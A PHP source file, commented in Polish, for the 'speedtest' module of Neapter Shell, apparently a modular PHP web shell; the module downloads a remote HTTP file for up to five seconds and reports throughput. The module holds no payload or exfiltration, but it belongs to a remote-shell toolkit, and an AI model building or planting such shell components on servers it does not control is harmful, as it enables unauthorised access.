<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Test predkosci lacza
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleSpeedtest extends ModuleAbstract
{
	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'speedtest' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.00 2011-10-25 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Test prędkości łącza

	Użycie:
		speedtest adres_do_zdalnego_pliku_http

	Przykład:
		speedtest http://test.online.kz/download/1.test
		speedtest http://test.online.kz/download/2.test
		speedtest http://test.online.kz/download/5mb.test

DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc !== 1 )
		{
			return $this -> getHelp();
		}

		/**
		 * Wspierany jest tylko protokul HTTP
		 */
		if( strncmp( $this -> oShell -> aArgv[0], 'http://', 7 ) !== 0 )
		{
			return 'Wspierany jest tylko protokół http!';
		}

		/**
		 * Naglowki
		 */
		$aStream = array
		(
			'http' => array
			(
				'method' => 'GET',
				'header' => "Connection: Close\r\n"
			)
		);


		/**
		 * Otwieranie polaczenia
		 */
		if( ( $rFp = fopen( $this -> oShell -> aArgv[0], 'r', FALSE, stream_context_create( $aStream ) ) ) === FALSE )
		{
			return 'Nie można pobrać pliku';
		}

		stream_set_timeout( $rFp, 15 );

		/**
		 * Pobieranie pliku
		 */
		$fTime = microtime( 1 );
		$iTotal = 0;
		$iCount = 0;

		while( ! feof( $rFp ) )
		{
			/**
			 * Test powinien trwac maksymalnie 5 sekund
			 */
			if(    ( ( $iTotal += strlen( fread( $rFp, 2048 ) ) ) < 2048 )
			    || ( ( $iCount > 50 ) && ( microtime( 1 ) - $fTime ) > 5 )
			)
			{
				break ;
			}

			++$iCount;
		}

		/**
		 * Zamykanie polaczenia
		 */
		fclose( $rFp );

		/**
		 * Statystyki
		 */
		return sprintf( "Pobrano: %d bajtów w %.4f sekundy\r\nŚrednia prędkość to: %.2f KB/s", $iTotal, $fTime = microtime( 1 ) - $fTime, ( $iTotal / $fTime ) / 1024 );
	}

}